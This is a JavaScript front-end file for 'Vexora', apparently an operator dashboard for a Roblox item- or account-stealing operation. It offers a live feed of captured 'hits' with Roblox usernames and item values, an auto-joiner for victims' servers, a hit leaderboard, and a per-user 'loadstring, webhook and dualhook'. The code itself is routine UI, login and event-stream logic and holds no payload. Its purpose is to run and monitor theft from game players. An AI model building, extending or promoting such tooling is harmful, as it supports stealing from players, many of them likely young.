import { api } from './api.js';
import { icon, esc, avatar, toast, money, logo } from './ui.js';
import * as pages from './pages.js';
import * as admin from './admin.js';
import { claimer as claimerPage } from './claimer.js';
import { settings } from './settings.js';

const NAV = [
  { group: 'Main' },
  { path: '/overview', label: 'Overview', icon: 'overview', render: pages.overview },
  { path: '/hits', label: 'Hits', icon: 'hits', render: pages.hits },
  { path: '/public-hits', label: 'Public hits', icon: 'globe', render: pages.publicHits, adminOnly: true },
  { path: '/servers', label: 'Servers', icon: 'radio', render: pages.servers },
  { path: '/claimer', label: 'Auto joiner', icon: 'bolt', render: claimerPage, adminOnly: true },
  { path: '/leaderboard', label: 'Leaderboard', icon: 'trophy', render: pages.leaderboard, adminOnly: true },
  { path: '/script', label: 'My script', icon: 'code', render: pages.script },
  { path: '/settings', label: 'Settings', icon: 'sliders', render: settings },
  { group: 'Admin', adminOnly: true },
  { path: '/admin/members', label: 'Members', icon: 'users', render: admin.members, adminOnly: true },
  { path: '/admin/hits', label: 'All hits', icon: 'hits', render: admin.adminHits, adminOnly: true },
  { path: '/admin/blacklist', label: 'Blacklist', icon: 'shield', render: admin.blacklist, adminOnly: true },
  { path: '/admin/system', label: 'System', icon: 'sliders', render: admin.system, adminOnly: true },
];

const TITLES = Object.fromEntries(NAV.filter((n) => n.path).map((n) => [n.path, n.label]));

/* ---------- tiny event bus ---------- */
const busHandlers = new Map();
const bus = {
  on(event, fn) {
    if (!busHandlers.has(event)) busHandlers.set(event, new Set());
    busHandlers.get(event).add(fn);
    return () => busHandlers.get(event)?.delete(fn);
  },
  emit(event, payload) {
    for (const fn of busHandlers.get(event) ?? []) {
      try { fn(payload); } catch (err) { console.error(err); }
    }
  },
};

const root = document.getElementById('root');
let currentUser = null;
let cleanup = () => {};
let source = null;

/* ---------- boot screen ---------- */
const hideBoot = () => {
  const el = document.getElementById('boot');
  if (!el || el.classList.contains('is-hidden')) return;
  el.classList.add('is-hidden');
  setTimeout(() => el.remove(), 500);
};

/* ---------- shell ---------- */
const sidebar = () => `
  <aside class="sidebar" id="sidebar">
    <div class="brand">
      <div class="brand-mark">${logo(34)}</div>
      <div class="brand-text"><strong>Vexora</strong><span>Dashboard</span></div>
    </div>
    <nav>
      ${NAV.map((item) => {
        if (item.group) {
          if (item.adminOnly && currentUser?.role !== 'admin') return '';
          return `<div class="nav-label">${esc(item.group)}</div>`;
        }
        if (item.adminOnly && currentUser?.role !== 'admin') return '';
        return `<a class="nav-item" href="${item.path}" data-link data-path="${item.path}">
          ${icon(item.icon, 16)}<span>${esc(item.label)}</span>
        </a>`;
      }).join('')}
    </nav>
    <div class="sidebar-foot">
      <button class="who" id="who">
        ${avatar(currentUser, 28)}
        <span class="who-meta">
          <strong>${esc(currentUser.username)}</strong>
          <span>Signed in as</span>
        </span>
      </button>
    </div>
  </aside>`;

const shell = (path) => `
  <div class="aurora"></div>
  <div class="app">
    ${sidebar()}
    <div class="main">
      <header class="topbar">
        <button class="btn btn-icon mobile-bar" id="burger">${icon('menu', 16)}</button>
        <div class="crumb">Vexora <b>/ ${esc(TITLES[path] ?? 'Overview')}</b></div>
        <div class="ticker" id="ticker">
          <i class="dot-live"></i>
          <b>listening for hits…</b>
          <span class="who">live</span>
        </div>
        <div class="topbar-right">
          <span class="live" id="live-pill"><i></i> Live</span>
          <button class="btn btn-icon" id="logout" title="Log out">${icon('logout', 15)}</button>
        </div>
      </header>
      <div class="content" id="page"></div>
    </div>
  </div>`;

const loginScreen = ({ message = '', discord = false } = {}) => `
  <div class="aurora"></div>
  <div class="auth-wrap">
    <div class="auth-card">
      <aside class="auth-brand">
        <div class="auth-brand-head">
          <span class="brand-mark auth-logo">${logo(46)}</span>
          <span class="auth-wordmark">Vexora</span>
        </div>
        <div class="auth-pitch">
          <div class="auth-kicker">Live capture dashboard</div>
          <p class="auth-headline">Every hit,<br />the second it lands.</p>
          <p class="auth-copy">One calm place for your captures, servers and receivers — streamed live, no refresh.</p>
        </div>
        <ul class="auth-points">
          <li>${icon('bolt', 13)}<span>Live hit feed with instant server joins</span></li>
          <li>${icon('code', 13)}<span>Personal loadstring, webhook and dualhook</span></li>
          <li>${icon('shield', 13)}<span>Your own username and password — no Discord</span></li>
        </ul>
        <div class="auth-foot">Vexora <i></i> Dashboard</div>
      </aside>
      <section class="auth-panel">
        <div class="auth-mobile-brand"><span class="brand-mark">${logo(26)}</span><strong>Vexora</strong></div>
        <div class="auth-tabs" role="tablist" aria-label="Account access">
          <button type="button" role="tab" aria-selected="true" data-auth-mode="login" class="on">Sign in</button>
          <button type="button" role="tab" aria-selected="false" data-auth-mode="register">Create account</button>
        </div>
        <h1 id="auth-title">Welcome back.</h1>
        <p class="auth-sub" id="auth-sub">Use your Vexora username and password to get back in.</p>
        ${message ? `<div class="auth-alert">${esc(message)}</div>` : ''}
        <div class="auth-error" id="auth-error" hidden></div>
        <form class="auth-form" id="auth-form">
          <div class="field">
            <label for="auth-username">Username</label>
            <input class="input" id="auth-username" name="username" placeholder="yourname" autocomplete="username" required minlength="3" maxlength="20" spellcheck="false" />
          </div>
          <div class="field">
            <div class="field-row">
              <label for="auth-password">Password</label>
              <button type="button" class="link-btn" id="auth-toggle" aria-label="Show password">${icon('eye', 14)}</button>
            </div>
            <input class="input" id="auth-password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required minlength="8" maxlength="200" />
          </div>
          <p class="hint" id="auth-hint">New here? Create an account — it takes a second.</p>
          <button class="btn btn-primary btn-auth" type="submit" id="auth-submit">Sign in</button>
        </form>
        ${discord ? `<div class="auth-divider">or</div><a class="btn btn-discord btn-auth" href="/auth/discord">Continue with Discord</a>` : ''}
        <p class="auth-fine">Passwords are salted and hashed with scrypt.</p>
      </section>
    </div>
  </div>`;

const wireLogin = () => {
  const form = root.querySelector('#auth-form');
  if (!form) return;

  const title = root.querySelector('#auth-title');
  const sub = root.querySelector('#auth-sub');
  const hint = root.querySelector('#auth-hint');
  const errorBox = root.querySelector('#auth-error');
  const submit = root.querySelector('#auth-submit');
  const password = root.querySelector('#auth-password');
  const toggle = root.querySelector('#auth-toggle');
  const tabs = [...root.querySelectorAll('[data-auth-mode]')];
  let mode = 'login';

  const setMode = (next) => {
    mode = next;
    const register = next === 'register';
    tabs.forEach((btn) => {
      btn.classList.toggle('on', btn.dataset.authMode === next);
      btn.setAttribute('aria-selected', String(btn.dataset.authMode === next));
    });
    title.textContent = register ? 'Create your account.' : 'Welcome back.';
    sub.textContent = register
      ? 'Pick a username and a password. No Discord needed.'
      : 'Use your Vexora username and password to get back in.';
    hint.textContent = register
      ? 'At least 8 characters. Usernames are 3–20 characters.'
      : 'New here? Create an account — it takes a second.';
    submit.textContent = register ? 'Create account' : 'Sign in';
    password.setAttribute('autocomplete', register ? 'new-password' : 'current-password');
    errorBox.hidden = true;
    errorBox.textContent = '';
  };

  tabs.forEach((btn) => btn.addEventListener('click', () => {
    if (btn.dataset.authMode !== mode) setMode(btn.dataset.authMode);
  }));

  toggle?.addEventListener('click', () => {
    const show = password.type === 'password';
    password.type = show ? 'text' : 'password';
    toggle.innerHTML = icon(show ? 'eyeOff' : 'eye', 14);
    toggle.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
  });

  root.querySelector('#auth-username')?.focus();

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = form.elements.username.value.trim();
    const secret = form.elements.password.value;
    const register = mode === 'register';
    errorBox.hidden = true;

    if (register && secret.length < 8) {
      errorBox.hidden = false;
      errorBox.textContent = 'Password must be at least 8 characters.';
      return;
    }

    submit.disabled = true;
    submit.textContent = register ? 'Creating account…' : 'Signing in…';
    try {
      if (register) await api.register(username, secret);
      else await api.login(username, secret);
      toast(register ? 'Account created. Welcome to Vexora.' : 'Signed in.', 'success');
      await boot();
    } catch (err) {
      errorBox.hidden = false;
      errorBox.textContent = err.message ?? 'Something went wrong. Try again.';
      submit.disabled = false;
      submit.textContent = register ? 'Create account' : 'Sign in';
    }
  });
};

const renderLogin = async (message = '') => {
  let config = { discord_oauth: false };
  try { config = await api.authConfig(); } catch { /* keep defaults */ }
  root.innerHTML = loginScreen({ message, discord: Boolean(config.discord_oauth) });
  wireLogin();
  hideBoot();
};

/* ---------- routing ---------- */
const navigate = (path, { push = true } = {}) => {
  if (push && window.location.pathname !== path) history.pushState({}, '', path);
  const route = NAV.find((n) => n.path === path) ?? NAV.find((n) => n.path === '/overview');
  cleanup?.();
  cleanup = () => {};

  root.innerHTML = shell(route.path);

  const page = root.querySelector('#page');
  const ctx = {
    user: currentUser,
    bus,
    navigate,
    refreshUser: () => boot({ soft: true }),
  };

  Promise.resolve(route.render(page, ctx))
    .then((fn) => { if (typeof fn === 'function') cleanup = fn; })
    .catch((err) => {
      page.innerHTML = `<div class="card"><div class="empty">
        <strong>${esc(err.message ?? 'Something broke rendering this page.')}</strong>
        <span>${err.status === 403 ? 'You may not have access.' : 'Try refreshing.'}</span>
      </div></div>`;
      if (err.status === 401) boot();
    });

  wireShell();
};

const wireShell = () => {
  root.querySelectorAll('[data-link]').forEach((a) => {
    a.addEventListener('click', (e) => {
      if (e.metaKey || e.ctrlKey || e.shiftKey) return;
      e.preventDefault();
      navigate(a.dataset.path ?? new URL(a.href, location.origin).pathname);
    });
  });

  root.querySelector('#logout')?.addEventListener('click', async () => {
    await api.logout().catch(() => {});
    currentUser = null;
    source?.close();
    boot();
  });

  root.querySelector('#who')?.addEventListener('click', () => navigate('/script'));

  const burger = root.querySelector('#burger');
  burger?.addEventListener('click', () => root.querySelector('#sidebar')?.classList.toggle('open'));
};

const paintActive = () => {
  root.querySelectorAll('.nav-item[data-path]').forEach((el) => {
    el.classList.toggle('active', el.dataset.path === location.pathname);
  });
};

/* ---------- live ---------- */
const connectStream = () => {
  source?.close();
  source = new EventSource('/api/public/stream');
  const pill = () => root.querySelector('#live-pill');

  source.addEventListener('hit', (e) => {
    try {
      const hit = JSON.parse(e.data);
      bus.emit('hit', hit);
      const ticker = root.querySelector('#ticker');
      if (ticker) {
        ticker.querySelector('b').textContent = `${hit.item} · ${money(hit.value)}`;
        ticker.querySelector('.who').textContent = hit.roblox_user || hit.user?.username || 'unknown';
        ticker.classList.remove('fresh');
        void ticker.offsetWidth;
        ticker.classList.add('fresh');
      }
    } catch { /* ignore */ }
  });
  source.addEventListener('series', () => {
    const p = pill();
    if (p) p.classList.remove('down');
  });
  source.onerror = () => {
    const p = pill();
    if (p) p.classList.add('down');
  };
  source.onopen = () => {
    const p = pill();
    if (p) p.classList.remove('down');
  };
};

/* ---------- boot ---------- */
async function boot({ soft = false } = {}) {
  try {
    const { user } = await api.me();
    currentUser = user;
    if (user.banned) {
      source?.close();
      root.innerHTML = `
        <div class="aurora"></div>
        <div class="auth-wrap">
          <div class="auth-card banned-card">
            <div class="banned-icon">${icon('ban', 22)}</div>
            <h1>You've been banned from Vexora.</h1>
            <p>${esc(user.ban_reason ?? 'Contact an administrator for details.')}</p>
            <p class="auth-fine">Vexora · access revoked</p>
          </div>
        </div>`;
      hideBoot();
      return;
    }
  } catch (err) {
    if (err.status === 401) {
      if (soft) return;
      await renderLogin();
      return;
    }
    await renderLogin(err.message);
    return;
  }

  const path = location.pathname === '/' ? '/overview' : location.pathname;
  if (!soft) connectStream();
  navigate(path, { push: false });
  paintActive();
  hideBoot();
}

window.addEventListener('popstate', () => {
  if (!currentUser) return;
  navigate(location.pathname, { push: false });
});

document.addEventListener('click', (e) => {
  const a = e.target.closest('a[data-link]');
  if (a && !root.contains(a)) {
    e.preventDefault();
    navigate(new URL(a.href, location.origin).pathname);
  }
});

boot();
